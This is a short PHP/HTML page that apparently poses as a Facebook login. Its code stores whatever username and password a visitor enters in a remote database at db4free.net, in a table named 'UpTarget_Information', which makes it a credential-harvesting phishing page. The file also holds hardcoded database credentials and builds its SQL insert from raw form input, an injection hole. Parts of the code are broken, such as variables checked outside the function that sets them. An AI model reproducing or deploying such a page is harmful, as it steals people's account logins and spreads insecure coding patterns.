<! Doctype Html>
<html>
<head>
<meta name="viewport"
content="width=device-width, initial-scale=1.0">
</head>
<body>
<?
function addData(){
$username="mrbimo";
$password="mrbimomrbimo";
$database=new PDO("mysql:host=db4free.net;dbname=mrbimo;",$username,$password);
echo("Ptofile");
if(isset($_POST['send'])){
$u=$_POST['username'];
$p=$_POST['password'];
$req=$database->prepare("INSERT INTO UpTarget_Information(Username,Password) VALUES('$u','$p')");
$req->execute();
};};
if (isset($_POST['send'])and$u==''or $p==""){
echo("Empty");
};
addData();
?>
<form method="POST" action="FacebookLogin.php">
<input type="TEXT" name="username" placeholder="Username">
<br>
<input type="PASSWORD" name="password" placeholder="Password">
<br>
<input type="SUBMIT" name="send" value="Login">
</form>
</body>
</html>